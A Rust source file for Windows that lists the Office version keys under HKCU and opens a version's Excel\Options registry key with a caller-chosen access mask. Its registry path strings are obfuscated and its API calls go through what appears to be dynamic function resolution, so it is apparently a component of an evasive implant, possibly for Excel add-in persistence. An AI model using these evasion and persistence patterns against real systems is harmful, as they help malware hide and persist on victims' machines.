// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//! office — enumerate HKCU\Software\Microsoft\Office\<ver> subkeys.

#![cfg(target_os = "windows")]

extern crate alloc;
use alloc::vec::Vec;
use alloc::string::String;
use core::ptr::null_mut;
use common::obf_cstr;
use crate::dfr::*;

pub fn enumerate_versions() -> Vec<String> {
    let mut out = Vec::new();
    obf_cstr! { let office = c"Software\\Microsoft\\Office"; }
    let mut h: usize = 0;
    let rc = match unsafe {
        RegOpenKeyExA(HKEY_CURRENT_USER, office.as_ptr() as *const i8, 0, KEY_READ, &mut h)
    } { Ok(c) => c, Err(_) => return out };
    if rc != ERROR_SUCCESS { return out; }

    let mut idx: u32 = 0;
    loop {
        let mut name = [0u8; 64];
        let mut len: u32 = name.len() as u32;
        let rc = match unsafe {
            RegEnumKeyExA(h, idx, name.as_mut_ptr() as *mut i8, &mut len, null_mut(), null_mut(), null_mut(), null_mut())
        } { Ok(c) => c, Err(_) => break };
        if rc == ERROR_NO_MORE_ITEMS { break; }
        if rc != ERROR_SUCCESS { break; }
        let s = core::str::from_utf8(&name[..len as usize]).unwrap_or("");
        if version_is_supported(s) { out.push(String::from(s)); }
        idx += 1;
    }
    let _ = unsafe { RegCloseKey(h) };
    out
}

fn version_is_supported(s: &str) -> bool {
    let bytes = s.as_bytes();
    if bytes.is_empty() { return false; }
    let major = bytes.iter().take_while(|b| (b'0'..=b'9').contains(b)).count();
    if major == 0 { return false; }
    let major_str = &s[..major];
    let n: u32 = major_str.parse().unwrap_or(0);
    (14..=99).contains(&n)
}

pub fn open_excel_options(ver: &str, sam: u32) -> Result<usize, ()> {
    obf_cstr! { let pre = c"Software\\Microsoft\\Office\\"; }
    obf_cstr! { let suf = c"\\Excel\\Options"; }
    let pre_s = core::str::from_utf8(pre.to_bytes()).unwrap_or("");
    let suf_s = core::str::from_utf8(suf.to_bytes()).unwrap_or("");
    let mut path = String::with_capacity(pre_s.len() + ver.len() + suf_s.len());
    path.push_str(pre_s);
    path.push_str(ver);
    path.push_str(suf_s);
    let mut c = Vec::with_capacity(path.len() + 1);
    c.extend_from_slice(path.as_bytes());
    c.push(0);
    let mut h: usize = 0;
    let rc = match unsafe {
        RegOpenKeyExA(HKEY_CURRENT_USER, c.as_ptr() as *const i8, 0, sam, &mut h)
    } { Ok(rc) => rc, Err(_) => return Err(()) };
    if rc != ERROR_SUCCESS { return Err(()); }
    Ok(h)
}

pub fn close(h: usize) {
    let _ = unsafe { RegCloseKey(h) };
}
